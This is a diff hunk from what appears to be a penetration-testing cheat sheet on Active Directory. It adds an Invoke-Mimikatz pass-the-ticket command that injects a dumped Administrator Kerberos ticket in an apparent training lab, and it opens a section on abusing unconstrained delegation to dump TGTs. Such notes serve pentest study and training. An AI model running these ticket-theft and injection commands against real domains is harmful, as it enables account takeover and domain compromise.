@@ -1375,7 +1375,9 @@ dir *.kirbi | findstr /I krbtgt | findstr /V "$@"
 ```
 kerberos::ptt C:\pentest\tickets\[0;9fc25]-2-0-60a10000-Administrator@krbtgt-TECH.LOCAL.kirbi
 ```
-
+```
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\student209\[0;15d1a5]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+```
 
 ## UNCONSTRAINED DELEGATION - RUBEUS
 Unconstrained delegation is a privilege that can be assigned to users or computers, this almost always happens on computers with services such as ISS and MSSQL. These services usually require access to a backend database on behalf of the authenticated user. When a user authenticates on a computer with Kerberos unrestricted delegation privilege enabled, the user's authenticated TGT ticket is stored in that computer's memory. If you have administrator access to this server, it is possible to dump all TGT tickets from memory.
